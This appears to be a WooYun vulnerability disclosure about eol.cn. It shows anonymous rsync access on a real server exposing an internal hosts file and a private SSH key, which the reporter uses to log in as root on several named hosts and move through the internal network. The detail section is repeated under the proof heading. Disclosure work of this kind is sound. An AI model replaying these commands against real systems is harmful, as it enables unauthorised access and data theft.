<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		中国教育网系统配置漏洞导致全站沦陷  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		中国教育网系统配置漏洞导致全站沦陷  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/盈盈无绪">盈盈无绪</a> 
</li><li>提交时间：		2013-10-27 15:12</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-10-27：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
									2013-12-11：	厂商已经主动忽略漏洞，细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">中国教育网 www.eol.cn 由于1个服务的配置错误导致全站沦陷</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail"></p><pre><code>rsync 211.151.94.241::gen/</code></pre><p class='detail'><br />
<br />
<br />
<br />
</p><pre><code>cat hosts<br />
# Do not remove the following line, or various programs<br />
# that require network functionality will fail.<br />
127.0.0.1       localhost<br />
202.205.109.141 debian141.eol.cn        debian141<br />
<br />
# The following lines are desirable for IPv6 capable hosts<br />
# ::1     ip6-localhost ip6-loopback<br />
# fe00::0 ip6-localnet<br />
# ff00::0 ip6-mcastprefix<br />
# ff02::1 ip6-allnodes<br />
# ff02::2 ip6-allrouters<br />
# ff02::3 ip6-allhosts<br />
#<br />
# 211.151.91.98           ipvs2<br />
#<br />
<br />
166.111.204.69		wowowo<br />
<br />
172.16.0.1		switch-01<br />
172.16.0.2		switch-02<br />
172.16.0.3		switch-03<br />
172.16.1.4		switch-04<br />
<br />
202.112.0.36		kiwi<br />
67.228.174.9            cucas<br />
<br />
#202.205.109.1		rhea<br />
202.205.109.2		www.eol.cn<br />
202.205.109.3		bbs<br />
202.205.109.4		db2.eol.cn<br />
202.205.109.5		jacana<br />
202.205.109.6		butterfly	db2<br />
#202.205.109.7		db1<br />
#202.205.109.8		bull<br />
202.205.109.8		crane<br />
202.205.109.9		ibis<br />
202.205.109.10		centra-2<br />
202.205.109.11		donkey2<br />
202.205.109.12		centra<br />
202.205.109.14		home<br />
202.205.109.15		deepblue<br />
202.205.109.17		Ian<br />
202.205.109.18		thorpe<br />
202.205.109.19		blue<br />
202.205.109.20		blog.edu.cn<br />
202.205.109.21		caps-2<br />
202.205.109.22		home2<br />
202.205.109.23		bluebird<br />
202.205.109.24		ceaie.edu.cn	blog-2<br />
202.205.109.25		egret<br />
202.205.109.26		thorpe-2<br />
202.205.109.27		blog<br />
202.205.109.28		gaokao4<br />
202.205.109.34		ad01<br />
202.205.109.35		ad02<br />
202.205.109.37		caps<br />
202.205.109.38		ftp		snoopy<br />
#202.205.109.45		hehe<br />
202.205.109.46		gaokao4<br />
202.205.109.47		home-limo<br />
202.205.109.48		eolftp<br />
202.205.109.50		node14<br />
202.205.109.51	        eagle<br />
202.205.109.52	        crane<br />
202.205.109.53		emu<br />
202.205.109.54		donkey<br />
202.205.109.55		bittern<br />
202.205.109.56		pause<br />
202.205.109.57		egret-2<br />
202.205.109.58		kookaburra<br />
202.205.109.59		macaw<br />
202.205.109.69		db1<br />
<br />
<br />
202.205.109.80	        bigip<br />
<br />
202.205.109.97		honeyyeater<br />
202.205.109.98		jay<br />
202.205.109.99		preview.eol.cn<br />
202.205.109.100		flamingo<br />
202.205.109.101		flamingo-2<br />
202.205.109.102		preview.eol.cn<br />
202.205.109.103	        flycatcher<br />
202.205.109.104		falcon<br />
<br />
<br />
202.205.109.110		goose<br />
202.205.109.111		hawk<br />
202.205.109.112		heron<br />
202.205.109.117		dove<br />
202.205.109.118		e2900-1<br />
202.205.109.119		e2900-2<br />
202.205.109.120		v240-1<br />
202.205.109.121		v240-2<br />
202.205.109.123		hummingbird<br />
202.205.109.124		hornbill<br />
202.205.109.125		bluelog<br />
202.205.109.127		boatbill<br />
<br />
202.205.109.150		bull<br />
202.205.109.155		lion<br />
<br />
202.205.109.178         rhea<br />
<br />
202.205.109.184	        merganser<br />
<br />
202.205.109.190	        marabou<br />
202.205.109.191	        mallard<br />
202.205.109.193	        motmot<br />
202.205.109.195	        philomela<br />
<br />
202.205.109.209		msu<br />
<br />
202.205.11.9		break		dns2<br />
<br />
202.205.11.42		giraffe<br />
202.205.11.43		snake<br />
<br />
202.205.11.69		green<br />
202.205.11.70		cyan<br />
202.205.11.71		kingfisher<br />
202.205.11.72		kingfisher-2<br />
<br />
202.205.176.34          moeweb1<br />
202.108.198.242         cvae<br />
<br />
202.205.7.57		gsy.idc<br />
202.205.7.58		idcmonitor<br />
<br />
211.151.91.97		Ian2<br />
211.151.91.98		ipvs2<br />
211.151.91.101		ipvs1<br />
211.151.91.102		alt2<br />
211.151.91.103		gaokao2<br />
211.151.91.104		bbs2<br />
#211.151.91.105		photo<br />
211.157.99.55           photonew<br />
202.205.109.210		photo<br />
211.151.91.107		free.eol.cn-2<br />
211.151.91.108		www.eol.cn-2<br />
<br />
#chisa.edu.cn<br />
211.151.90.1		media<br />
211.151.90.2		media<br />
211.151.90.3		chisaiflow<br />
211.151.90.4		fangtan<br />
211.151.90.5		realserver<br />
211.151.89.145		chisachat<br />
211.151.89.185		chisa-db<br />
211.151.89.188		magpie<br />
<br />
202.112.35.245          hehe<br />
211.142.41.140          dtmy</code></pre><p class='detail'><br />
<br />
<br />
<br />
发现一个ssh.tgz的文件<br />
<br />
</p><pre><code>164713 10 27 14:01 ssh2.tgz</code></pre><p class='detail'><br />
<br />
解压缩<br />
<br />
</p><pre><code>id_rsa		id_rsa.pub</code></pre><p class='detail'><br />
<br />
在上面的服务器里面选一个登陆<br />
<br />
</p><pre><code>ssh -i id_rsa root@211.151.91.104<br />
<br />
ipvs2:~# ps -ef<br />
UID        PID  PPID  C STIME TTY          TIME CMD<br />
root         1     0  0  2007 ?        00:03:51 init [2]<br />
root         2     1  0  2007 ?        00:04:34 [migration/0]<br />
root         3     1  0  2007 ?        00:01:14 [ksoftirqd/0]<br />
root         4     1  0  2007 ?        00:04:25 [migration/1]<br />
<br />
ipvs2:~# ifconfig<br />
eth0      Link encap:Ethernet  HWaddr 00:C0:9F:38:C1:95<br />
          inet addr:211.151.91.98  Bcast:211.151.91.111  Mask:255.255.255.240<br />
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
          RX packets:1915675700 errors:5 dropped:144 overruns:0 frame:3<br />
          TX packets:3921889199 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:1000<br />
          RX bytes:2378780214 (2.2 GiB)  TX bytes:1560078143 (1.4 GiB)<br />
          Base address:0xe400 Memory:febc0000-febe0000<br />
<br />
eth1      Link encap:Ethernet  HWaddr 00:C0:9F:38:C1:96<br />
          inet addr:10.0.0.98  Bcast:10.0.0.255  Mask:255.255.255.0<br />
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
          RX packets:495776699 errors:0 dropped:180 overruns:0 frame:0<br />
          TX packets:3661157267 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:1000<br />
          RX bytes:849113923 (809.7 MiB)  TX bytes:1267393581 (1.1 GiB)<br />
          Base address:0xe000 Memory:feba0000-febc0000<br />
<br />
lo        Link encap:Local Loopback<br />
          inet addr:127.0.0.1  Mask:255.0.0.0<br />
          UP LOOPBACK RUNNING  MTU:16436  Metric:1<br />
          RX packets:196550863 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:196550863 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0<br />
          RX bytes:117126749 (111.7 MiB)  TX bytes:117126749 (111.7 MiB)<br />
<br />
history | grep ssh<br />
    5  ssh 10.0.0.39<br />
    6  ssh 10.0.0.43<br />
    8  ssh 10.0.0.43<br />
   10  ssh 10.0.0.39<br />
   11  ssh 10.0.0.43<br />
   12  ssh 10.0.0.39<br />
   14  ssh 10.0.0.43<br />
<br />
ssh 10.0.0.39<br />
Last login: Sun Sep 29 11:17:10 2013 from 10.0.0.98<br />
Linux cockatoo 2.6.18-6-686 #1 SMP Sat Dec 27 09:31:05 UTC 2008 i686<br />
<br />
The programs included with the Debian GNU/Linux system are free software;<br />
the exact distribution terms for each program are described in the<br />
individual files in /usr/share/doc/*/copyright.<br />
<br />
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br />
permitted by applicable law.<br />
cockatoo:~# ps -ef<br />
UID        PID  PPID  C STIME TTY          TIME CMD<br />
root         1     0  0  2009 ?        00:07:12 init [2]<br />
root         2     1  0  2009 ?        00:00:00 [migration/0]<br />
root         3     1  0  2009 ?        00:00:10 [ksoftirqd/0]<br />
root         4     1  0  2009 ?        00:01:13 [migration/1]<br />
root         5     1  0  2009 ?        00:01:37 [ksoftirqd/1]<br />
<br />
cockatoo:~# ifconfig<br />
eth0      Link encap:Ethernet  HWaddr 00:16:35:3C:2B:E4<br />
          inet addr:10.0.0.39  Bcast:10.0.0.255  Mask:255.255.255.0<br />
          inet6 addr: fe80::216:35ff:fe3c:2be4/64 Scope:Link<br />
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
          RX packets:2782554477 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:1741093814 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:1000<br />
          RX bytes:344340646 (328.3 MiB)  TX bytes:86728051 (82.7 MiB)<br />
          Interrupt:201<br />
<br />
eth0:0    Link encap:Ethernet  HWaddr 00:16:35:3C:2B:E4<br />
          inet addr:10.0.0.47  Bcast:10.0.0.255  Mask:255.255.255.0<br />
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
          Interrupt:201<br />
<br />
lo        Link encap:Local Loopback<br />
          inet addr:127.0.0.1  Mask:255.0.0.0<br />
          inet6 addr: ::1/128 Scope:Host<br />
          UP LOOPBACK RUNNING  MTU:16436  Metric:1<br />
          RX packets:36885 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:36885 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0<br />
          RX bytes:13680105 (13.0 MiB)  TX bytes:13680105 (13.0 MiB)<br />
<br />
<br />
有个rsyncd.conf<br />
<br />
[wcmback]<br />
        path = /home/wcmback<br />
        comment = Apache2 Config Files<br />
        hosts allow = 10.0.0.0/24 202.205.109.0/24 202.112.0.36 202.205.11.0/25 202.205.109.119<br />
[site]<br />
        path = /etc/apache2/sites-enabled<br />
       comment = Apache2 Config Files<br />
        hosts allow = 10.0.0.0/24 202.205.109.0/24 202.112.0.36 202.205.11.0/25<br />
[teacher]<br />
        path = /home/wcm/edu_cn/jiao_shi_zhao_pin_1582<br />
        comment = Whole www htdocs<br />
        hosts allow = 10.0.0.0/24 202.205.109.0/24 202.112.0.36 202.205.11.0/25 121.194.3.180/255.255.255.192<br />
[conf]<br />
        path = /home/ftp_test/conf<br />
        comment = Whole www htdocs<br />
        hosts allow = 10.0.0.0/24 202.205.109.0/24 202.112.0.36 202.205.11.0/25 121.194.3.180/255.255.255.192<br />
[new_files]<br />
	path=/home/wcm/new_files<br />
	comment = eol wcm files<br />
	ignore errors = yes<br />
	read only = no<br />
	hosts allow = 10.0.0.142/32 10.0.0.143/32<br />
[eol_cn]<br />
        path=/home/wcm/eol_cn<br />
        comment = eol wcm files<br />
        ignore errors = yes<br />
        read only = no<br />
        hosts allow = 10.0.0.142/32 10.0.0.143/32<br />
[new_files_images]<br />
        path=/home/wcm/new_files/images/cer.net/gaokao/2011shiti<br />
        comment = eol wcm files<br />
        ignore errors = yes<br />
        read only = no<br />
        hosts allow = 10.0.0.142/32 10.0.0.143/32<br />
<br />
[new_files_zt]<br />
        path=/home/wcm/new_files/zt<br />
        comment = eol wcm files<br />
        ignore errors = yes<br />
        read only = no<br />
        hosts allow = 10.0.0.142/32 10.0.0.143/32<br />
<br />
cockatoo:/home/wcm# cd eol_cn/<br />
cockatoo:/home/wcm/eol_cn# ls<br />
04_bys_zhao_pin_4407					   fudao_10487			     lanqiu_11735				te_jian_3992<br />
04_xiaoyuan_cj_1978					   fudao_10499			     lao_dong_fa_yuan_4385			team_2012<br />
04chun_jie_kuai_xun_1975				   fudao_10511			     lao_dong_he_tong_9642			teams_5149<br />
04chun_jie_zhuan_ti_1974				   fudao_10522			     lao_dong_he_tong_jie_chu_zhong_zhi_4391	tebie_ch_4107<br />
05_10_2267						   fudao_10533			     lao_dong_he_tong_qian_ding_bian_geng_4392	tebie_ch_4520<br />
05_11_2268						   fudao_10547			     laow_1889					tepjs_4440</code></pre><p class='detail'><br />
<br />
<br />
<br />
再换个机器试试<br />
<br />
<br />
<br />
</p><pre><code>ssh -i i 121.194.3.201<br />
<br />
<br />
<br />
Last login: Sun Oct 27 14:52:07 2013 from 202.205.109.80<br />
Linux xinxi2009-01 2.6.18-6-amd64 #1 SMP Sun Feb 10 17:50:19 UTC 2008 x86_64<br />
<br />
The programs included with the Debian GNU/Linux system are free software;<br />
the exact distribution terms for each program are described in the<br />
individual files in /usr/share/doc/*/copyright.<br />
<br />
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br />
permitted by applicable law.<br />
<br />
<br />
<br />
xinxi2009-01:~# ifconfig<br />
eth2      Link encap:Ethernet  HWaddr 00:23:8B:A9:AA:10<br />
          inet addr:121.194.3.201  Bcast:121.194.3.255  Mask:255.255.255.0<br />
          inet6 addr: fe80::223:8bff:fea9:aa10/64 Scope:Link<br />
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
          RX packets:11859164102 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:15624895490 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:100<br />
          RX bytes:1655586719825 (1.5 TiB)  TX bytes:19411809874839 (17.6 TiB)<br />
          Base address:0xac00 Memory:fcde0000-fce00000<br />
<br />
eth3      Link encap:Ethernet  HWaddr 00:23:8B:A9:AA:11<br />
          inet addr:118.186.63.12  Bcast:118.186.63.127  Mask:255.255.255.128<br />
          UP BROADCAST MULTICAST  MTU:1500  Metric:1<br />
          RX packets:98621 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:27891 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:1000<br />
          RX bytes:8199957 (7.8 MiB)  TX bytes:18628920 (17.7 MiB)<br />
          Base address:0xa800 Memory:fcd80000-fcda0000<br />
<br />
lo        Link encap:Local Loopback<br />
          inet addr:127.0.0.1  Mask:255.0.0.0<br />
          inet6 addr: ::1/128 Scope:Host<br />
          UP LOOPBACK RUNNING  MTU:16436  Metric:1<br />
          RX packets:17767291494 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:17767291494 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0<br />
          RX bytes:43181600100598 (39.2 TiB)  TX bytes:43181600100598 (39.2 TiB)<br />
<br />
xinxi2009-01:~# id<br />
uid=0(root) gid=0(root) groups=0(root)</code></pre><p class='detail'><br />
<br />
<br />
<br />
问题太严重了，不继续了。 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail"></p><pre><code>rsync 211.151.94.241::gen/</code></pre><p class='detail'><br />
<br />
<br />
<br />
</p><pre><code>cat hosts<br />
# Do not remove the following line, or various programs<br />
# that require network functionality will fail.<br />
127.0.0.1       localhost<br />
202.205.109.141 debian141.eol.cn        debian141<br />
<br />
# The following lines are desirable for IPv6 capable hosts<br />
# ::1     ip6-localhost ip6-loopback<br />
# fe00::0 ip6-localnet<br />
# ff00::0 ip6-mcastprefix<br />
# ff02::1 ip6-allnodes<br />
# ff02::2 ip6-allrouters<br />
# ff02::3 ip6-allhosts<br />
#<br />
# 211.151.91.98           ipvs2<br />
#<br />
<br />
166.111.204.69		wowowo<br />
<br />
172.16.0.1		switch-01<br />
172.16.0.2		switch-02<br />
172.16.0.3		switch-03<br />
172.16.1.4		switch-04<br />
<br />
202.112.0.36		kiwi<br />
67.228.174.9            cucas<br />
<br />
#202.205.109.1		rhea<br />
202.205.109.2		www.eol.cn<br />
202.205.109.3		bbs<br />
202.205.109.4		db2.eol.cn<br />
202.205.109.5		jacana<br />
202.205.109.6		butterfly	db2<br />
#202.205.109.7		db1<br />
#202.205.109.8		bull<br />
202.205.109.8		crane<br />
202.205.109.9		ibis<br />
202.205.109.10		centra-2<br />
202.205.109.11		donkey2<br />
202.205.109.12		centra<br />
202.205.109.14		home<br />
202.205.109.15		deepblue<br />
202.205.109.17		Ian<br />
202.205.109.18		thorpe<br />
202.205.109.19		blue<br />
202.205.109.20		blog.edu.cn<br />
202.205.109.21		caps-2<br />
202.205.109.22		home2<br />
202.205.109.23		bluebird<br />
202.205.109.24		ceaie.edu.cn	blog-2<br />
202.205.109.25		egret<br />
202.205.109.26		thorpe-2<br />
202.205.109.27		blog<br />
202.205.109.28		gaokao4<br />
202.205.109.34		ad01<br />
202.205.109.35		ad02<br />
202.205.109.37		caps<br />
202.205.109.38		ftp		snoopy<br />
#202.205.109.45		hehe<br />
202.205.109.46		gaokao4<br />
202.205.109.47		home-limo<br />
202.205.109.48		eolftp<br />
202.205.109.50		node14<br />
202.205.109.51	        eagle<br />
202.205.109.52	        crane<br />
202.205.109.53		emu<br />
202.205.109.54		donkey<br />
202.205.109.55		bittern<br />
202.205.109.56		pause<br />
202.205.109.57		egret-2<br />
202.205.109.58		kookaburra<br />
202.205.109.59		macaw<br />
202.205.109.69		db1<br />
<br />
<br />
202.205.109.80	        bigip<br />
<br />
202.205.109.97		honeyyeater<br />
202.205.109.98		jay<br />
202.205.109.99		preview.eol.cn<br />
202.205.109.100		flamingo<br />
202.205.109.101		flamingo-2<br />
202.205.109.102		preview.eol.cn<br />
202.205.109.103	        flycatcher<br />
202.205.109.104		falcon<br />
<br />
<br />
202.205.109.110		goose<br />
202.205.109.111		hawk<br />
202.205.109.112		heron<br />
202.205.109.117		dove<br />
202.205.109.118		e2900-1<br />
202.205.109.119		e2900-2<br />
202.205.109.120		v240-1<br />
202.205.109.121		v240-2<br />
202.205.109.123		hummingbird<br />
202.205.109.124		hornbill<br />
202.205.109.125		bluelog<br />
202.205.109.127		boatbill<br />
<br />
202.205.109.150		bull<br />
202.205.109.155		lion<br />
<br />
202.205.109.178         rhea<br />
<br />
202.205.109.184	        merganser<br />
<br />
202.205.109.190	        marabou<br />
202.205.109.191	        mallard<br />
202.205.109.193	        motmot<br />
202.205.109.195	        philomela<br />
<br />
202.205.109.209		msu<br />
<br />
202.205.11.9		break		dns2<br />
<br />
202.205.11.42		giraffe<br />
202.205.11.43		snake<br />
<br />
202.205.11.69		green<br />
202.205.11.70		cyan<br />
202.205.11.71		kingfisher<br />
202.205.11.72		kingfisher-2<br />
<br />
202.205.176.34          moeweb1<br />
202.108.198.242         cvae<br />
<br />
202.205.7.57		gsy.idc<br />
202.205.7.58		idcmonitor<br />
<br />
211.151.91.97		Ian2<br />
211.151.91.98		ipvs2<br />
211.151.91.101		ipvs1<br />
211.151.91.102		alt2<br />
211.151.91.103		gaokao2<br />
211.151.91.104		bbs2<br />
#211.151.91.105		photo<br />
211.157.99.55           photonew<br />
202.205.109.210		photo<br />
211.151.91.107		free.eol.cn-2<br />
211.151.91.108		www.eol.cn-2<br />
<br />
#chisa.edu.cn<br />
211.151.90.1		media<br />
211.151.90.2		media<br />
211.151.90.3		chisaiflow<br />
211.151.90.4		fangtan<br />
211.151.90.5		realserver<br />
211.151.89.145		chisachat<br />
211.151.89.185		chisa-db<br />
211.151.89.188		magpie<br />
<br />
202.112.35.245          hehe<br />
211.142.41.140          dtmy</code></pre><p class='detail'><br />
<br />
<br />
<br />
发现一个ssh.tgz的文件<br />
<br />
</p><pre><code>164713 10 27 14:01 ssh2.tgz</code></pre><p class='detail'><br />
<br />
解压缩<br />
<br />
</p><pre><code>id_rsa		id_rsa.pub</code></pre><p class='detail'><br />
<br />
在上面的服务器里面选一个登陆<br />
<br />
</p><pre><code>ssh -i id_rsa root@211.151.91.104<br />
<br />
ipvs2:~# ps -ef<br />
UID        PID  PPID  C STIME TTY          TIME CMD<br />
root         1     0  0  2007 ?        00:03:51 init [2]<br />
root         2     1  0  2007 ?        00:04:34 [migration/0]<br />
root         3     1  0  2007 ?        00:01:14 [ksoftirqd/0]<br />
root         4     1  0  2007 ?        00:04:25 [migration/1]<br />
<br />
ipvs2:~# ifconfig<br />
eth0      Link encap:Ethernet  HWaddr 00:C0:9F:38:C1:95<br />
          inet addr:211.151.91.98  Bcast:211.151.91.111  Mask:255.255.255.240<br />
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
          RX packets:1915675700 errors:5 dropped:144 overruns:0 frame:3<br />
          TX packets:3921889199 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:1000<br />
          RX bytes:2378780214 (2.2 GiB)  TX bytes:1560078143 (1.4 GiB)<br />
          Base address:0xe400 Memory:febc0000-febe0000<br />
<br />
eth1      Link encap:Ethernet  HWaddr 00:C0:9F:38:C1:96<br />
          inet addr:10.0.0.98  Bcast:10.0.0.255  Mask:255.255.255.0<br />
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
          RX packets:495776699 errors:0 dropped:180 overruns:0 frame:0<br />
          TX packets:3661157267 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:1000<br />
          RX bytes:849113923 (809.7 MiB)  TX bytes:1267393581 (1.1 GiB)<br />
          Base address:0xe000 Memory:feba0000-febc0000<br />
<br />
lo        Link encap:Local Loopback<br />
          inet addr:127.0.0.1  Mask:255.0.0.0<br />
          UP LOOPBACK RUNNING  MTU:16436  Metric:1<br />
          RX packets:196550863 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:196550863 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0<br />
          RX bytes:117126749 (111.7 MiB)  TX bytes:117126749 (111.7 MiB)<br />
<br />
history | grep ssh<br />
    5  ssh 10.0.0.39<br />
    6  ssh 10.0.0.43<br />
    8  ssh 10.0.0.43<br />
   10  ssh 10.0.0.39<br />
   11  ssh 10.0.0.43<br />
   12  ssh 10.0.0.39<br />
   14  ssh 10.0.0.43<br />
<br />
ssh 10.0.0.39<br />
Last login: Sun Sep 29 11:17:10 2013 from 10.0.0.98<br />
Linux cockatoo 2.6.18-6-686 #1 SMP Sat Dec 27 09:31:05 UTC 2008 i686<br />
<br />
The programs included with the Debian GNU/Linux system are free software;<br />
the exact distribution terms for each program are described in the<br />
individual files in /usr/share/doc/*/copyright.<br />
<br />
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br />
permitted by applicable law.<br />
cockatoo:~# ps -ef<br />
UID        PID  PPID  C STIME TTY          TIME CMD<br />
root         1     0  0  2009 ?        00:07:12 init [2]<br />
root         2     1  0  2009 ?        00:00:00 [migration/0]<br />
root         3     1  0  2009 ?        00:00:10 [ksoftirqd/0]<br />
root         4     1  0  2009 ?        00:01:13 [migration/1]<br />
root         5     1  0  2009 ?        00:01:37 [ksoftirqd/1]<br />
<br />
cockatoo:~# ifconfig<br />
eth0      Link encap:Ethernet  HWaddr 00:16:35:3C:2B:E4<br />
          inet addr:10.0.0.39  Bcast:10.0.0.255  Mask:255.255.255.0<br />
          inet6 addr: fe80::216:35ff:fe3c:2be4/64 Scope:Link<br />
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
          RX packets:2782554477 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:1741093814 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:1000<br />
          RX bytes:344340646 (328.3 MiB)  TX bytes:86728051 (82.7 MiB)<br />
          Interrupt:201<br />
<br />
eth0:0    Link encap:Ethernet  HWaddr 00:16:35:3C:2B:E4<br />
          inet addr:10.0.0.47  Bcast:10.0.0.255  Mask:255.255.255.0<br />
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
          Interrupt:201<br />
<br />
lo        Link encap:Local Loopback<br />
          inet addr:127.0.0.1  Mask:255.0.0.0<br />
          inet6 addr: ::1/128 Scope:Host<br />
          UP LOOPBACK RUNNING  MTU:16436  Metric:1<br />
          RX packets:36885 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:36885 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0<br />
          RX bytes:13680105 (13.0 MiB)  TX bytes:13680105 (13.0 MiB)<br />
<br />
<br />
有个rsyncd.conf<br />
<br />
[wcmback]<br />
        path = /home/wcmback<br />
        comment = Apache2 Config Files<br />
        hosts allow = 10.0.0.0/24 202.205.109.0/24 202.112.0.36 202.205.11.0/25 202.205.109.119<br />
[site]<br />
        path = /etc/apache2/sites-enabled<br />
       comment = Apache2 Config Files<br />
        hosts allow = 10.0.0.0/24 202.205.109.0/24 202.112.0.36 202.205.11.0/25<br />
[teacher]<br />
        path = /home/wcm/edu_cn/jiao_shi_zhao_pin_1582<br />
        comment = Whole www htdocs<br />
        hosts allow = 10.0.0.0/24 202.205.109.0/24 202.112.0.36 202.205.11.0/25 121.194.3.180/255.255.255.192<br />
[conf]<br />
        path = /home/ftp_test/conf<br />
        comment = Whole www htdocs<br />
        hosts allow = 10.0.0.0/24 202.205.109.0/24 202.112.0.36 202.205.11.0/25 121.194.3.180/255.255.255.192<br />
[new_files]<br />
	path=/home/wcm/new_files<br />
	comment = eol wcm files<br />
	ignore errors = yes<br />
	read only = no<br />
	hosts allow = 10.0.0.142/32 10.0.0.143/32<br />
[eol_cn]<br />
        path=/home/wcm/eol_cn<br />
        comment = eol wcm files<br />
        ignore errors = yes<br />
        read only = no<br />
        hosts allow = 10.0.0.142/32 10.0.0.143/32<br />
[new_files_images]<br />
        path=/home/wcm/new_files/images/cer.net/gaokao/2011shiti<br />
        comment = eol wcm files<br />
        ignore errors = yes<br />
        read only = no<br />
        hosts allow = 10.0.0.142/32 10.0.0.143/32<br />
<br />
[new_files_zt]<br />
        path=/home/wcm/new_files/zt<br />
        comment = eol wcm files<br />
        ignore errors = yes<br />
        read only = no<br />
        hosts allow = 10.0.0.142/32 10.0.0.143/32<br />
<br />
cockatoo:/home/wcm# cd eol_cn/<br />
cockatoo:/home/wcm/eol_cn# ls<br />
04_bys_zhao_pin_4407					   fudao_10487			     lanqiu_11735				te_jian_3992<br />
04_xiaoyuan_cj_1978					   fudao_10499			     lao_dong_fa_yuan_4385			team_2012<br />
04chun_jie_kuai_xun_1975				   fudao_10511			     lao_dong_he_tong_9642			teams_5149<br />
04chun_jie_zhuan_ti_1974				   fudao_10522			     lao_dong_he_tong_jie_chu_zhong_zhi_4391	tebie_ch_4107<br />
05_10_2267						   fudao_10533			     lao_dong_he_tong_qian_ding_bian_geng_4392	tebie_ch_4520<br />
05_11_2268						   fudao_10547			     laow_1889					tepjs_4440</code></pre><p class='detail'><br />
<br />
<br />
<br />
再换个机器试试<br />
<br />
<br />
<br />
</p><pre><code>ssh -i i 121.194.3.201<br />
<br />
<br />
<br />
Last login: Sun Oct 27 14:52:07 2013 from 202.205.109.80<br />
Linux xinxi2009-01 2.6.18-6-amd64 #1 SMP Sun Feb 10 17:50:19 UTC 2008 x86_64<br />
<br />
The programs included with the Debian GNU/Linux system are free software;<br />
the exact distribution terms for each program are described in the<br />
individual files in /usr/share/doc/*/copyright.<br />
<br />
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br />
permitted by applicable law.<br />
<br />
<br />
<br />
xinxi2009-01:~# ifconfig<br />
eth2      Link encap:Ethernet  HWaddr 00:23:8B:A9:AA:10<br />
          inet addr:121.194.3.201  Bcast:121.194.3.255  Mask:255.255.255.0<br />
          inet6 addr: fe80::223:8bff:fea9:aa10/64 Scope:Link<br />
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />
          RX packets:11859164102 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:15624895490 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:100<br />
          RX bytes:1655586719825 (1.5 TiB)  TX bytes:19411809874839 (17.6 TiB)<br />
          Base address:0xac00 Memory:fcde0000-fce00000<br />
<br />
eth3      Link encap:Ethernet  HWaddr 00:23:8B:A9:AA:11<br />
          inet addr:118.186.63.12  Bcast:118.186.63.127  Mask:255.255.255.128<br />
          UP BROADCAST MULTICAST  MTU:1500  Metric:1<br />
          RX packets:98621 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:27891 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:1000<br />
          RX bytes:8199957 (7.8 MiB)  TX bytes:18628920 (17.7 MiB)<br />
          Base address:0xa800 Memory:fcd80000-fcda0000<br />
<br />
lo        Link encap:Local Loopback<br />
          inet addr:127.0.0.1  Mask:255.0.0.0<br />
          inet6 addr: ::1/128 Scope:Host<br />
          UP LOOPBACK RUNNING  MTU:16436  Metric:1<br />
          RX packets:17767291494 errors:0 dropped:0 overruns:0 frame:0<br />
          TX packets:17767291494 errors:0 dropped:0 overruns:0 carrier:0<br />
          collisions:0 txqueuelen:0<br />
          RX bytes:43181600100598 (39.2 TiB)  TX bytes:43181600100598 (39.2 TiB)<br />
<br />
xinxi2009-01:~# id<br />
uid=0(root) gid=0(root) groups=0(root)</code></pre><p class='detail'><br />
<br />
<br />
<br />
问题太严重了，不继续了。 </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">安全需要很小心 </p>
